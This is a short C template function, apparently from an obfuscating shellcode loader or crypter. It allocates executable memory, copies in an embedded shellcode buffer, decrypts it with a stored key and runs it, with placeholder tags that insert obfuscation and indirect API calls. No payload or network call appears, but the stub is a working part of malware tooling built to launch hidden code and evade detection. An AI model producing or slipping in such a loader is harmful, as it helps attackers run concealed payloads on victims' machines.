static forceinline void _obf_execute_shellcode(_obf_api_caller_t caller) {
    {{obf:*}} void *buf = {{api-n:mmap}}(NULL, _obf_shellcode_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_PRIVATE, -1, 0);
    {{obf:*}} {{api-n:memcpy}}(buf, _obf_shellcode, _obf_shellcode_size);
    {{obf:*}} _obf_decrypt_shellcode(buf, _obf_shellcode_key, _obf_shellcode_size);
    {{obf:*}} ((void (*)())buf)();
    {{obf:*}}
}